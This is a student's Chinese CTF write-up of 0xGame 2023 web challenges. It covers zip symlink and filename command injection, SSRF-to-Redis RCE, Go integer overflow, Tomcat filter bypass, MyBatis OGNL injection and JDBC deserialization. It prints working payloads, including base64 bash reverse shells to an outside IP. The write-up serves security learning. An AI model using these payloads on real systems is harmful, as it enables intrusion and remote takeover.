index(subpath): user_dir = os.path.join('./uploads', md5(request.remote_addr)) if not os.path.exists(user_dir): os.mkdir(user_dir) if '..' in subpath: return 'blacklist' current_path = os.path.join(user_dir, subpath) if os.path.isdir(current_path): res = [] res.append({'type': 'Directory', 'name': '..'}) for v in os.listdir(current_path): if os.path.isfile(os.path.join(current_path, v)): res.append({'type': 'File', 'name': v}) else: res.append({'type': 'Directory', 'name': v}) return render_template('index.html', upload_path=user_dir, res=res) else: return send_file(current_path) if __name__ == '__main__': app.run(host='0.0.0.0', port=8000, debug=False) 根据题目给出的源码，我们分析发现os.system('unzip -o {} -d {}'.format(zip_path, dest_path))此处进行了命令执行，凭借我浅薄的记忆，我认出了这里是类似unzip的相关漏洞，可以用软链接进行RCE的 index函数中，主要就是创建一个zip文件上传后的目录，其中还过滤了..也就是防止目录穿越，最后还提取相关关键词：type、name等等来渲染前端页面。 unzip函数中，主要就是对我们上传的zip文件进行解压，并覆盖原有文件，将解压得到的文件上传至-d所指的目录下 方法一： 众所周知 Linux 存在软链接这一功能, 而 zip 支持压缩软链接, 程序又是用 unzip 命令进行解压缩, 因此会存在这个漏洞 (相比之下如果使用 Python 的 zipfile 库进行解压缩, 就不会存在这个问题) ln -s / test zip -y test.zip test 软链接用法我认为可以参考：Linux 命令之软连接详解 这里zip使用-y命令的原因：zip压缩保持软连接，使用参数-y，可以使zip能够保留软链接。 那我们在kali下操作一番 ![image-20231104193101598](0xGame 2023/image-20231104193101598.png) 随后找到zip并上传至靶机 ![image-20231104193207219](0xGame 2023/image-20231104193207219.png) 如上图点击flag即可下载得到 方法二： @app.route('/unzip', methods=['POST']) def unzip(): f = request.files.get('file') if not f.filename.endswith('.zip'): return redirect('/') user_dir = os.path.join('./uploads', md5(request.remote_addr)) if not os.path.exists(user_dir): os.mkdir(user_dir) zip_path = os.path.join(user_dir, f.filename) dest_path = os.path.join(user_dir, f.filename[:-4]) f.save(zip_path) os.system('unzip -o {} -d {}'.format(zip_path, dest_path)) return redirect('/') 调用 os.system 执行 unzip 命令, 但是路径是直接拼接过去的, 而 zip 的文件名又可控, 这里存在一个很明显的命令注入 burp 上传时抓包把 filename 改成下面的命令即可 test.zip;bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi81NTU1ICAwPiYx}|{base64,-d}|{bash,-i}';1.zip ![image-20231104200335114](0xGame 2023/image-20231104200335114.png) bp发送，如下图成功反弹shell，拿到flag ![image-20231104200329612](0xGame 2023/image-20231104200329612.png) 接下来我又很疑惑为何这里恶意命令前后需要两个zip后缀 ![image-20231104201010508](0xGame 2023/image-20231104201010508.png) 如上图，我自己分析了一波感觉是1.zip肯定是必有的，因为代码会检测filename的后缀是否含有.zip，而test.zip的保留我认为是为了令unzip -o {}命令的正常使用，如果没有test.zip，那就是-o bash -c…那这里就不存在要解压的zip文件了，但如果有test.zip的话，就是-o test.zip;bash…，很明显-o是解压test.txt的，可以正常使用（我也不知道分析的对不对，希望日后可以有缘看到合理的解释┭┮﹏┭┮ [Week 3] web_snapshot 这道题知识点是ssrf+gopher打redis（主从复制RCE）–没学过。。。。因此先跟着复现 题目会通过 curl 函数请求网页, 并将 html 源码保存在 Redis 数据库中 请求网页的过程很明显存在 ssrf, 但是限制输入的 url 只能以 http / https 开头 function _get($url) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_HEADER, 0); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); $data = curl_exec($curl); curl_close($curl); return $data; } 首先注意 curl_setopt 设置的参数 CURLOPT_FOLLOWLOCATION, 代表允许 curl 根据返回头中的 Location 进行重定向 参考: https://www.php.net/manual/zh/function.curl-setopt.php ![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207504.png](0xGame 2023/202311021207504.png) ![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207029.png](0xGame 2023/202311021207029.png) ![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207958.png](0xGame 2023/202311021207958.png) 而 curl 支持 dict / gopher 等协议, 那么我们就可以通过 Location 头把协议从 http 重定向至 dict / gopher, 这个技巧在一些关于 ssrf 的文章里面也会提到 结合 redis 的知识点, 可以尝试 redis 主从复制 rce https://www.cnblogs.com/xiaozi/p/13089906.html https://github.com/Dliv3/redis-rogue-server --工具 payload： import requests import re def urlencode(data): enc_data = '' for i in data: h = str(hex(ord(i))).replace('0x', '') if len(h) == 1: enc_data += '%0' + h.upper() else: enc_data += '%' + h.upper() return enc_data def gen_payload(payload): redis_payload = '' for i in payload.split(' '): arg_num = '*' + str(len(i.split(' '))) redis_payload += arg_num + '\\r ' for j in i.split(' '): arg_len = '$' + str(len(j)) redis_payload += arg_len + '\\r ' redis_payload += j + '\\r ' gopher_payload = 'gopher://db:6379/_' + urlencode(redis_payload) return gopher_payload payload1 = ''' slaveof vps-ip 21000 config set dir /tmp config set dbfilename exp.so quit ''' payload2 = '''slaveof no one module load /tmp/exp.so system.exec 'env' quit ''' print(gen_payload(payload1)) print(gen_payload(payload2)) ![image-20231104225534463](0xGame 2023/image-20231104225534463.png) &lt;?php // step 1 //header('Location: gopher://db:6379/_%2A%31%0D%0A%24%30%0D%0A%0D%0A%2A%33%0D%0A%24%37%0D%0A%73%6C%61%76%65%6F%66%0D%0A%24%31%34%0D%0A%31%32%34%2E%32%32%30%2E%32%33%33%2E%32%36%0D%0A%24%35%0D%0A%36%35%35%33%34%0D%0A%2A%34%0D%0A%24%36%0D%0A%63%6F%6E%66%69%67%0D%0A%24%33%0D%0A%73%65%74%0D%0A%24%33%0D%0A%64%69%72%0D%0A%24%34%0D%0A%2F%74%6D%70%0D%0A%2A%34%0D%0A%24%36%0D%0A%63%6F%6E%66%69%67%0D%0A%24%33%0D%0A%73%65%74%0D%0A%24%31%30%0D%0A%64%62%66%69%6C%65%6E%61%6D%65%0D%0A%24%36%0D%0A%65%78%70%2E%73%6F%0D%0A%2A%31%0D%0A%24%34%0D%0A%71%75%69%74%0D%0A%2A%31%0D%0A%24%30%0D%0A%0D%0A'); // step 2 header('Location: gopher://db:6379/_%2A%31%0D%0A%24%30%0D%0A%0D%0A%2A%33%0D%0A%24%37%0D%0A%73%6C%61%76%65%6F%66%0D%0A%24%32%0D%0A%6E%6F%0D%0A%24%33%0D%0A%6F%6E%65%0D%0A%2A%33%0D%0A%24%36%0D%0A%6D%6F%64%75%6C%65%0D%0A%24%34%0D%0A%6C%6F%61%64%0D%0A%24%31%31%0D%0A%2F%74%6D%70%2F%65%78%70%2E%73%6F%0D%0A%2A%32%0D%0A%24%31%31%0D%0A%73%79%73%74%65%6D%2E%65%78%65%63%0D%0A%24%35%0D%0A%27%65%6E%76%27%0D%0A%2A%31%0D%0A%24%34%0D%0A%71%75%69%74%0D%0A%2A%31%0D%0A%24%30%0D%0A%0D%0A'); ?&gt; 这里将step1和step2分为两个php文件。 同时在 vps 上启动一个 php 服务器, 例如 php -S 0.0.0.0:65000, 然后将上述两个PHP文件上传至该php服务的根目录下，最后在题目当中去访问这两个PHP文件 ![image-20231104225700858](0xGame 2023/image-20231104225700858.png) ![image-20231104225711072](0xGame 2023/image-20231104225711072.png) ![image-20231104225734808](0xGame 2023/image-20231104225734808.png) 显示如图所示的状态，同时记得开启Redis Rogue Server的监听 ![image-20231104225828706](0xGame 2023/image-20231104225828706.png) 如图所示，在访问1.php之后会看到如图所示的状态，代表成功打入，记得21000端口要开放 之后在访问2.php之后 ![image-20231104225922080](0xGame 2023/image-20231104225922080.png) 会显示上图所示的link，我们访问即可看到env环境变量中的flag ![image-20231104225322560](0xGame 2023/image-20231104225322560.png) 这里得注意几个点 首先 gopher 得分两次打, 不然你在执行 slaveof IP Port 命令之后又立即执行了 slave of no one, 这就导致根本没有时间去主从复制 exp.so 其次在使用 gopher 发送 redis 命令的时候记得结尾加上 quit, 不然会一直卡住 然后注意 redis 的主机名是 db, 而不是 127.0.0.1, 因此访问 redis 数据库得用 db:6379 如果用 dict 协议打的话, 得调整一下 payload 顺序 dict://db:6379/config:set:dir:/tmp dict://db:6379/config:set:dbfilename:exp.so dict://db:6379/slaveof:host.docker.internal:21000 dict://db:6379/module:load:/tmp/exp.so dict://db:6379/slave:no:one dict://db:6379/system.exec:env dict://db:6379/module:unload:system 因为每次执行命令之间会存在一定的时间间隔, 所以得先设置 dir 和 dbfilename, 然后再 slaveof, 不然最终同步的文件名和路径还是原来的 /data/dump.rdb [Week 3] GoShop package main import ( \"crypto/rand\" \"embed\" \"fmt\" \"github.com/gin-contrib/sessions\" \"github.com/gin-contrib/sessions/cookie\" \"github.com/gin-gonic/gin\" \"github.com/google/uuid\" \"html/template\" \"net/http\" \"os\" \"strconv\" ) type User struct { Id string Money int64 Items map[string]int64 } type Product struct { Name string Price int64 } var users map[string]*User var products []*Product //go:embed public var fs embed.FS func init() { users = make(map[string]*User) products = []*Product{ {Name: \"Apple\", Price: 10}, {Name: \"Banana\", Price: 50}, {Name: \"Orange\", Price: 100}, {Name: \"Flag\", Price: 999999999}, } } func IndexHandler(c *gin.Context) { c.HTML(200, \"index.html\", gin.H{}) } func InfoHandler(c *gin.Context) { s := sessions.Default(c) if s.Get(\"id\") == nil { u := uuid.New().String() users[u] = &amp;User{Id: u, Money: 100, Items: make(map[string]int64)} s.Set(\"id\", u) s.Save() } user := users[s.Get(\"id\").(string)] c.JSON(200, gin.H{ \"user\": user, }) } func ResetHandler(c *gin.Context) { s := sessions.Default(c) s.Clear() u := uuid.New().String() users[u] = &amp;User{Id: u, Money: 100, Items: make(map[string]int64)} s.Set(\"id\", u) s.Save() c.JSON(200, gin.H{ \"message\": \"Reset success\", }) } func BuyHandler(c *gin.Context) { s := sessions.Default(c) user := users[s.Get(\"id\").(string)] data := make(map[string]interface{}) c.ShouldBindJSON(&amp;data) var product *Product for _, v := range products { if data[\"name\"] == v.Name { product = v break } } if product == nil { c.JSON(200, gin.H{ \"message\": \"No such product\", }) return } n, _ := strconv.Atoi(data[\"num\"].(string)) if n &lt; 0 { c.JSON(200, gin.H{ \"message\": \"Product num can't be negative\", }) return } if user.Money &gt;= product.Price*int64(n) { user.Money -= product.Price * int64(n) user.Items[product.Name] += int64(n) c.JSON(200, gin.H{ \"message\": fmt.Sprintf(\"Buy %v * %v success\", product.Name, n), }) } else { c.JSON(200, gin.H{ \"message\": \"You don't have enough money\", }) } } func SellHandler(c *gin.Context) { s := sessions.Default(c) user := users[s.Get(\"id\").(string)] data := make(map[string]interface{}) c.ShouldBindJSON(&amp;data) var product *Product for _, v := range products { if data[\"name\"] == v.Name { product = v break } } if product == nil { c.JSON(200, gin.H{ \"message\": \"No such product\", }) return } count := user.Items[data[\"name\"].(string)] n, _ := strconv.Atoi(data[\"num\"].(string)) if n &lt; 0 { c.JSON(200, gin.H{ \"message\": \"Product num can't be negative\", }) return } if count &gt;= int64(n) { user.Money += product.Price * int64(n) user.Items[product.Name] -= int64(n) c.JSON(200, gin.H{ \"message\": fmt.Sprintf(\"Sell %v * %v success\", product.Name, n), }) } else { c.JSON(200, gin.H{ \"message\": \"You don't have enough product\", }) } } func FlagHandler(c *gin.Context) { s := sessions.Default(c) user := users[s.Get(\"id\").(string)] v, ok := user.Items[\"Flag\"] if !ok || v &lt;= 0 { c.JSON(200, gin.H{ \"message\": \"You must buy &lt;code&gt;flag&lt;/code&gt; first\", }) return } flag, _ := os.ReadFile(\"/flag\") c.JSON(200, gin.H{ \"message\": fmt.Sprintf(\"Here is your flag: &lt;code&gt;%s&lt;/code&gt;\", string(flag)), }) } func main() { secret := make([]byte, 16) rand.Read(secret) tpl, _ := template.ParseFS(fs, \"public/index.html\") store := cookie.NewStore(secret) r := gin.Default() r.SetHTMLTemplate(tpl) r.Use(sessions.Sessions(\"gosession\", store)) r.GET(\"/\", IndexHandler) api := r.Group(\"/api\") { api.GET(\"/info\", InfoHandler) api.POST(\"/buy\", BuyHandler) api.POST(\"/sell\", SellHandler) api.GET(\"/flag\", FlagHandler) api.GET(\"/reset\", ResetHandler) } r.StaticFileFS(\"/static/main.js\", \"public/main.js\", http.FS(fs)) r.StaticFileFS(\"/static/simple.css\", \"public/simple.css\", http.FS(fs)) r.Run(\":8000\") } 题目是一个商店, 初始 money 为 100, 需要购买金额为 999999999 的 flag 商品后才能拿到 flag 这题就是审计代码，不过我也没学过go语言，不过我看了一番猜测问题可能会出现在如下位置： ![image-20231105092845595](0xGame 2023/image-20231105092845595.png) ![image-20231105092853470](0xGame 2023/image-20231105092853470.png) 这里是判断用户购买金额以及数量的地方，接下来就看wp了 程序使用了 strconv.Atoi(data[\"num\"].(string)) 将 json 传递的 num 字符串转换成了 int 类型的变量 n 后面判断用户的 money 时将其转换成了 int64 类型, 而 product.Price 本身也是 int64 类型 if user.Money &gt;= product.Price*int64(n) { user.Money -= product.Price * int64(n) user.Items[product.Name] += int64(n) c.JSON(200, gin.H{ \"message\": fmt.Sprintf(\"Buy %v * %v success\", product.Name, n), }) } else { c.JSON(200, gin.H{ \"message\": \"You don't have enough money\", }) } 这里先介绍一些概念 Go 语言是强类型语言, 包含多种数据类型, 以数字类型为例, 存在 uint8 uint16 uint32 uint64 (无符号整型) 和 int8 int16 int32 int64 (有符号整型) 等类型 Go 语言在编译期会检查源码中定义的变量是否存在溢出, 例如 var i uint8 = 99999 会使得编译不通过, 但是并不会检查变量的运算过程中是否存在溢出, 例如 var i uint8 = a * b, 如果程序没有对变量的取值范围做限制, 那么在部分场景下就可能存在整数溢出漏洞 上面的 BuyHandler 虽然限制了 n 不能为负数, 但是并没有限制 n 的最大值 因此我们可以控制 n, 使得 product.Price * int64(n) 溢出为一个负数, 之后进行 user.Money -= product.Price * int64(n) 运算的时候, 当前用户的 money 就会增加, 最终达到一个可以购买 flag 商品的金额, 从而拿到 flag 查阅相关文档可以知道 int64 类型的范围是 -9223372036854775808 ~ 9223372036854775807 经过简单的计算或者瞎猜, 可以购买数量为 922337203695477808 的 apple ![image-20231105093447613](0xGame 2023/image-20231105093447613.png) 点击get flag，成功拿到 ![image-20231105093500557](0xGame 2023/image-20231105093500557.png) [Week 4] spring Hint 1: Spring Actuator Hint 2: 看看 /actuator/env 再看看 /actuator/heapdump 根据题目提示这里会有信息泄露，于是我上网搜查了一下相关信息，结合提示我们来看一下有哪些敏感信息，首先访问 env 泄露配置信息 ![image-20231105094132544](0xGame 2023/image-20231105094132544.png) 这里看到了用户名和密码，不过密码不可见，不过这里的用户名提示我们flag就在password，所以我们思路就是想办法得到密码的明文 mappings 泄露路由信息 ![image-20231105094341321](0xGame 2023/image-20231105094341321.png) 访问之后可以看到存在诸多路由信息，我们可以有选择的去读取 heapdump 泄露堆栈信息 这个在Spring MVC架构中是可用的，会泄露出推栈信息，其中是可以窃取到一些关键的信息，比如一些关键的Key，或者数据库连接密码，但是扫描工具没把它列为扫描端点。 看了一下文章，其中说是要利用一些工具的，地址如下： https://github.com/whwlsfb/JDumpSpider 这里直接下载jar包，同时确保本地有maven与java1.8以上的环境，直接按如下命令运行即可 java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump 注意，将所要获取的信息文件放入至于jar同一目录下 ![image-20231105100900189](0xGame 2023/image-20231105100900189.png) 如上图，成功得到flag 或者用其它工具比如 Memory Analyze Tool (MAT) 也行，用 MAT 的话查询语句如下 SELECT * FROM java.util.LinkedHashMap$Entry x WHERE(toString(x.key).contains(\"app.password\")) [Week 4] auth_bypass Hint 1: Tomcat Filter 绕过 (网上有类似的文章 也可以自己尝试 fuzz 一些畸形 url 路径) Hint 2: 题目通过 war 包部署 预期需要 RCE 尝试通过任意文件下载获取更多信息 Hint 3: 利用 WEB-INF 目录 Hint 4: 你可能会用到的网站: https://tools.zjun.info/runtime-exec-payloads/ 看了一眼题目给的附件，源码如下 package com.example.demo; import javax.servlet.*; import javax.servlet.http.HttpServletRequest; import java.io.IOException; public class AuthFilter implements Filter { @Override public void init(FilterConfig filterConfig) { } @Override public void destroy() { } @Override public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException { HttpServletRequest request = (HttpServletRequest) req; if (request.getRequestURI().contains(\"..\")) { resp.getWriter().write(\"blacklist\"); return; } if (request.getRequestURI().startsWith(\"/download\")) { resp.getWriter().write(\"unauthorized access\"); } else { chain.doFilter(req, resp); } } } 这里主要是限制了..与download防止用户的目录穿越以及限制download路由的访问，接下来看一下另一个文件 package com.example.demo; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.FileInputStream; import java.io.IOException; public class DownloadServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException { String currentPath = this.getServletContext().getRealPath(\"/assets/\"); Object fileNameParameter = req.getParameter(\"filename\"); if (fileNameParameter != null) { String fileName = (String) fileNameParameter; resp.setHeader(\"Content-Disposition\",\"attachment;filename=\"+fileName); try (FileInputStream input = new FileInputStream(currentPath + fileName)) { byte[] buffer = new byte[4096]; while (input.read(buffer) != -1) { resp.getOutputStream().write(buffer); } } } else { resp.setContentType(\"text/html\"); resp.getWriter().write(\"&lt;a href=\\\"/download?filename=avatar.jpg\\\"&gt;avatar.jpg&lt;/a&gt;\"); } } } 靠着GPT分析了一波，这段代码的作用就是获取到服务器上文件的真实路径以及文件名，以供后续的文件下载功能的使用，下载题目提示我们tomact filter绕过，那我们去看看怎么个事儿 这里绕过方式很多种，参考如下文章： Java安全之Filter权限绕过 ![image-20231105102419042](0xGame 2023/image-20231105102419042.png) 如图，这里我将download进行url编码后，这里页面显示成功访问了，不过这里还可以多/绕过，如下图 ![image-20231105102608265](0xGame 2023/image-20231105102608265.png) 这里尝试直接读取flag，但依旧是无权访问 ![image-20231105102719747](0xGame 2023/image-20231105102719747.png) 接下来也就没思路了，看wp 然后可以通过 //download?filename=avatar.jpg 下载文件, 但是无法读取 /flag (提示 Permission denied), 那么很明显需要 RCE 根据题目描述, 网站使用 war 打包 这个 war 其实也就相当于压缩包, Tomcat 在部署 war 的时候会将其解压, 而压缩包内会存在一个 WEB-INF 目录, 目录里面包含编译好的 .class 文件以及 web.xml (保存路由和类的映射关系) 这里浅浅了解一下WEB-INF目录： WEB-INF 是 Java 的 WEB 应用的安全目录。如果想在页面中直接访问其中的文件，必须通过 web.xml 文件对要访问的文件进行相应映射才能访问。 WEB-INF 主要包含一下文件或目录： /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。 /WEB-INF/database.properties：数据库配置文件 ![image-20231105103345796](0xGame 2023/image-20231105103345796.png) 如图进行访问下载得到文件 ![image-20231105103414371](0xGame 2023/image-20231105103414371.png) 这里的内部构造看不太懂，所以靠wp了： 存在 EvilServlet, 映射的路由为 /You_Find_This_Evil_Servlet_a76f02cb8422 根据网上文章的知识点, 通过包名 (com.example.demo.EvilServlet) 构造对应的 class 文件路径并下载 //download?filename=../WEB-INF/classes/com/example/demo/EvilServlet.class 下载之后我选择了jdk打开class文件 // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo; import java.io.IOException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; public class EvilServlet extends HttpServlet { public EvilServlet() { } protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException { String cmd = req.getParameter(\"Evil_Cmd_Arguments_fe37627fed78\"); try { Runtime.getRuntime().exec(cmd); resp.getWriter().write(\"success\"); } catch (Exception var5) { resp.getWriter().write(\"error\"); } } } 这里上述代码提示我们是处理的post请求：doPost 直接 POST 访问 /You_Find_This_Evil_Servlet_a76f02cb8422 传个参就能执行命令 最后因为没有回显, 需要反弹 shell 或者通过 curl + burp collaborator 外带 flag ![image-20231105105149246](0xGame 2023/image-20231105105149246.png) 这里我直接hackbar进行执行了，如下图，但我不理解的是为何/readflag就能读取flag ![image-20231105105139403](0xGame 2023/image-20231105105139403.png) 不过官方wp采用的bp方式，有以下几个注意点： 这里首先得注意传入 Runtime.exec 的命令需要进行一次编码 https://www.adminxe.com/tools/code.html https://ares-x.com/tools/runtime-exec/ https://github.com/Threekiii/Awesome-Redteam/blob/master/scripts/runtime-exec-payloads.html 具体原因大家可以参考下面两篇文章 https://www.anquanke.com/post/id/243329 https://y4er.com/posts/java-exec-command/ 然后 POST 传递命令时得先 urlencode 一次 [Week 4] YourBatis Hint 1: 关注题目名称/描述 以及 pom.xml 中的依赖 Hint 2: SQL 注入不是考点 题目需要 RCE Hint 3: MyBatis RCE 尝试结合网上的文章构造 Payload Hint 4: 注意反编译 jar 包的时候请不要使用 jd-gui 尝试使用 jadx-gui 或 IDEA Hint 5: 你可能会用到的网站: https://tools.zjun.info/runtime-exec-payloads/ Hint 6: 在进行 RCE 的时候 因为 OGNL 的解析问题 所以最终传入 Runtime.exec() 的命令内不得包含 { 和 } 可以尝试编码绕过 这里让我们关注题目名称，这里我直接搜索了mybatis漏洞，发现有很多相关复现文章，在此之前我们先打开jar包，之后将其中的文件用idea打开 &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.1.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-j&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter-test&lt;/artifactId&gt; &lt;version&gt;2.3.1&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 这里让我们关注一下pom.xml，通过这个文件可以查看 jar 包使用的第三方库 这里我感觉重点就是mybatis-spring-boot-starter–版本为2.1.1，于是胡乱搜了一通，发现下面的信息 ![image-20231105111503601](0xGame 2023/image-20231105111503601.png) 那这里估计就是跟着现有的漏洞去复现了，加上题目提示我们存在sql注入以及RCE，我们关键词一搜一大把，重点就是找到正确合理的文章了 Mybatis 从SQL注入到OGNL注入 从一道CTF题浅谈MyBatis与Ognl的那些事 UserSqlProvider // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.yourbatis.provider; import org.apache.ibatis.jdbc.SQL; public class UserSqlProvider { public UserSqlProvider() { } public String buildGetUsers() { return (new SQL() { { this.SELECT(\"*\"); this.FROM(\"users\"); } }).toString(); } public String buildGetUserByUsername(final String username) { return (new SQL() { { this.SELECT(\"*\"); this.FROM(\"users\"); this.WHERE(String.format(\"username = '%s'\", username)); } }).toString(); } } 这里显示了查询的sql语句，重点在最后一个方法：select * from users where…，这里估计就是漏洞注入点了 看了看文章，感觉payload格式应该是这样： ${RCE} 但不了解java的rce的代码，只能看wp了： ${@java.lang.Runtime@getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}\")} 但是很显然是会失败的, 因为传入的命令包含了 { 和 }, 会被递归解析为另一个 OGNL 表达式的开头和结尾 这个点可能比较难, 所以后面给出了 hint 解决方案是只要不出现大括号就行, 方法很多, 这里给出一种, 利用 OGNL 调用 Java 自身的 base64 decode 方法 这里要将bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}进行base64编码 ${@java.lang.Runtime@getRuntime().exec(new java.lang.String(@java.util.Base64@getDecoder().decode('YmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzh4TWpRdU1qSXdMakl6TXk0eU5pODFOVFUxSURBK0pqRT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfQ==')))} ![image-20231105113238166](0xGame 2023/image-20231105113238166.png) 如上图，拿到flag [Week 4] TestConnection Hint 1: JDBC 会不会存在一些漏洞? Hint 2: MySQL / PostgreSQL Jdbc Attack Hint 3: 你可能会用到的网站: https://tools.zjun.info/runtime-exec-payloads/ 这里似乎考的就是MySQL / PostgreSQL Jdbc Attack 了，下面跟着wp复现 JDBC 就是 Java 用于操作数据库的接口, 通过一个统一规范的 JDBC 接口可以实现同一段代码兼容不同类型数据库的访问 JDBC URL 就是用于连接数据库的字符串, 格式为 `jdbc:db-type://host:port/db-name?param=value` db-type 就是数据库类型, 例如 postgresql, mysql, mssql, oracle, sqlite db-name 是要使用的数据库名 param 是要传入的参数, 比如 user, password, 指定连接时使用的编码类型等等 当 jdbc url 可控时, 如果目标网站使用了旧版的数据库驱动, 在特定情况下就可以实现 RCE 参考文章: https://tttang.com/archive/1877/ https://xz.aliyun.com/t/11812 https://forum.butian.net/share/1339 在pom.xml中看到两个依赖：mysql与postgresql ![image-20231105153731477](0xGame 2023/image-20231105153731477.png) 给了两个依赖, mysql 和 postgresql, 对应两种利用方式 然后还有 commons-collections 依赖, 这个主要是方便大家在后面用 ysoserial 工具去生成反序列化 payload 首先是 mysql 驱动的利用 结合网上文章可以构造对应的 jdbc url： jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc 首先得注意, 因为题目给的代码是 DriverManager.getConnection(url, username, password);, 即会单独传入一个 username 参数, 因此 url 中的 username 会被后面的 username 给覆盖 网上的部分利用工具会通过 username 来区分不同的 payload, 所以得注意 username 要单独传, 不然写在 url 里面就被覆盖了 其次, 因为 jdbc url 本身也符合 url 的规范, 所以在传 url 参数的时候, 需要把 url 本身全部进行 url 编码, 防止服务器错把 autoDeserialize, queryInterceptors 这些参数当成是一个 http get 参数, 而不是 jdbc url 里面的参数 最后依然是 Runtime.exec 命令编码的问题 一些 mysql jdbc 利用工具 https://github.com/4ra1n/mysql-fake-server https://github.com/rmb122/rogue_mysql_server payload /testConnection?driver=com.mysql.cj.jdbc.Driver&amp;url=jdbc:mysql://vps-ip:3308/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;username=deser_CC31_bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}&amp;password=123 url 编码 /testConnection?driver=com.mysql.cj.jdbc.Driver&amp;url=%6a%64%62%63%3a%6d%79%73%71%6c%3a%2f%2f%31%32%34%2e%32%32%30%2e%32%33%33%2e%32%36%3a%33%33%30%38%2f%74%65%73%74%3f%61%75%74%6f%44%65%73%65%72%69%61%6c%69%7a%65%3d%74%72%75%65%26%71%75%65%72%79%49%6e%74%65%72%63%65%70%74%6f%72%73%3d%63%6f%6d%2e%6d%79%73%71%6c%2e%63%6a%2e%6a%64%62%63%2e%69%6e%74%65%72%63%65%70%74%6f%72%73%2e%53%65%72%76%65%72%53%74%61%74%75%73%44%69%66%66%49%6e%74%65%72%63%65%70%74%6f%72&amp;username=%64%65%73%65%72%5f%43%43%33%31%5f%62%61%73%68%20%2d%63%20%7b%65%63%68%6f%2c%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%6a%51%75%4d%6a%49%77%4c%6a%49%7a%4d%79%34%79%4e%69%38%31%4e%54%55%31%49%44%41%2b%4a%6a%45%3d%7d%7c%7b%62%61%73%65%36%34%2c%2d%64%7d%7c%7b%62%61%73%68%2c%2d%69%7d&amp;password=123 这里尝试了老多次了，我感觉就是需要有一个公网ip来开启mysql服务，如下图，随后bp发包去发送恶意命令进行RCE ![image-20231105164759475](0xGame 2023/image-20231105164759475.png) 如上图，证明发送成功 ![image-20231105164923715](0xGame 2023/image-20231105164923715.png) 最后在env中可以看到flag ![image-20231105164747944](0xGame 2023/image-20231105164747944.png) 0x02 后记 终于复现完了，虽然感觉做题体验感不好，但出的题真的有水平啊（因为全不会，新生赛就这么高强度？？？？ 总的来说，很多知识点都没见过，就这四周的知识点就够我学一阵儿了，同时我依旧困惑于如何去学习提高代码水平，感觉目前的自己就是exp不会，脚本不会，审计代码也很有难度。真的全是bug┭┮﹏┭┮，感觉似乎要认真地重新学学代码了 0x03 参考文章 0xGame 2023 Web Official Writeup --官方wp php is_numeric函数的绕过 常见php函数绕过 [CTF]php is_numeric与弱等于(==)绕过 常见的Web源码泄漏漏洞 Springboot之actuator配置不当的漏洞利用 Spring Boot Actuator 漏洞利用 Spring Boot Actuator 未授权的测试与利用思路 Java安全之JDBC Attacks Java 